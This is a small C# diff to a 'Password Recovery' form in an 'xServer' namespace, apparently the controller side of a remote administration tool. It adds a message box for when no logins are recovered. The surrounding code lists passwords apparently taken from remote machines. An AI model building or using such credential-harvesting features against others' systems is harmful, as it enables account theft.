@@ -86,6 +86,9 @@ namespace xServer.Forms
                     Invoke(new MethodInvoker(() => { lstPasswords.Items.AddRange(items.ToArray()); }));
                     UpdateRecoveryCount();
                 }
+
+                if (logins.Length == 0)
+                    MessageBox.Show("Could not recover anything!", "Password Recovery", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch
             {
